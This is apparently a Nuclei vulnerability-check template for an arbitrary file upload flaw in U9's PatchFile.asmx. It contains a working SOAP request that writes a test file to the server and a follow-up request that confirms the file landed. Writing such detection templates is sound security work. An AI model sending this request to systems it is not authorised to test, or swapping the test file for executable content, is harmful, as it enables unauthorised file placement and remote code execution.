u9-patchfile-upload.yaml

id: u9-patchfile-upload

info:
  name: U9 PatchFile.asmx Arbitrary File Upload
  author: ProjectDiscoveryAI
  severity: high
  description: |
    An arbitrary file upload vulnerability in U9 PatchFile.asmx allows attackers to upload files to the server.
    This can lead to various security issues including remote code execution.
  tags: file-upload,arbitrary-upload

http:
  - raw:
      - |
        POST /CS/Office/AutoUpdates/PatchFile.asmx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=utf-8
        Connection: close

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <SaveFile xmlns="http://tempuri.org/">
              <binData>MTIzNDU2</binData>
              <path>./</path>
              <fileName>dudesite.txt</fileName>
            </SaveFile>
          </soap:Body>
        </soap:Envelope>

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "<SaveFileResult>true</SaveFileResult>"

  - raw:
      - |
        GET /CS/Office/AutoUpdates/dudesite.txt HTTP/1.1
        Host: {{Hostname}}
        Connection: close

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "MTIzNDU2"